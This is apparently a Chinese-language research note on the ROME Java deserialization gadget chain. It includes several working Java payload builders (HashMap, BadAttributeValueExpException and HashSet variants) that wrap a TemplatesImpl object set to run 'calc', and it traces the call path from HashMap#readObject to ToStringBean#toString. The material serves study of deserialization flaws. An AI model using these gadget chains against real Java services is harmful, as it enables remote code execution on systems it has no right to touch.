# ROME

## 手写

```java
public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl("calc");
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ToStringBean toStringBean = new ToStringBean(Templates.class, o);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        Reflections.setFieldValue(delegate,"_equalsBean",equalsBean);
        return Gadgets.makeMap(delegate, delegate);
    }
```

假如我们使用`BadAttributeValueExpException`来触发是不是也可以

```java
public Object getObject(String command) throws Exception {
        Object o = Gadgets.createTemplatesImpl("calc");
        ToStringBean toStringBean = new ToStringBean(Templates.class, o);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        BadAttributeValueExpException expException = new BadAttributeValueExpException("dem0");
        Reflections.setFieldValue(expException,"val",equalsBean);
        return expException;
    }
```

简化一下

```java
Object o = Gadgets.createTemplatesImpl("calc");
ToStringBean toStringBean = new ToStringBean(Templates.class, o);
EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
HashMap o1 = Gadgets.makeMap(equalsBean, "o");
```

有一个想法 如果没有hashmap 这里还能触发吗？使用hashset。 本质上是一样的，没有区别

```java
        Object o = Gadgets.createTemplatesImpl("calc");
        ToStringBean toStringBean = new ToStringBean(Templates.class, o);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, equalsBean);
        byte[] ser = Serializer.serialize(map);
        Deserializer.deserialize(ser);
```



## 分析

![image-20220513082004576](https://img.dem0dem0.top/images/image-20220513082004576.png)

hashmap#readobject == > ObjectBean#hashcode

![image-20220513082041477](https://img.dem0dem0.top/images/image-20220513082041477.png) 

EqualsBead#beanHashCode`这个中间需要包裹一下ObjectBean(主要是把_equalsBean#_obj变成toString )`可以发射实现 == > ToStringBean#toString

![image-20220513082114248](https://img.dem0dem0.top/images/image-20220513082114248.png)

![image-20220513082211859](https://img.dem0dem0.top/images/image-20220513082211859.png)

ToStringBean#toString ==> ToString#toString(prefix)

![image-20220513082335074](https://img.dem0dem0.top/images/image-20220513082335074.png)

调用getter方法

```
 TemplatesImpl.getOutputProperties()
 NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 NativeMethodAccessorImpl.invoke(Object, Object[])
 DelegatingMethodAccessorImpl.invoke(Object, Object[])
```

当然这里如果可以直接触发toString的话，可以减少其中的步骤(`BadAttributeValueExpException`之后又一个可以触发toString触发的起点)。

## 拓展

但是我们发现`equalBean的equals`方法其实也是可以触发的。

![image-20220513084226030](https://img.dem0dem0.top/images/image-20220513084226030.png)

## 总结

- kick-off gadget：`java.util.HashMap#readObject()`
- sink gadget：`com.sun.syndication.feed.impl.ToStringBean#toString()`
- chain gadget：`com.sun.syndication.feed.impl.ObjectBean#toString()`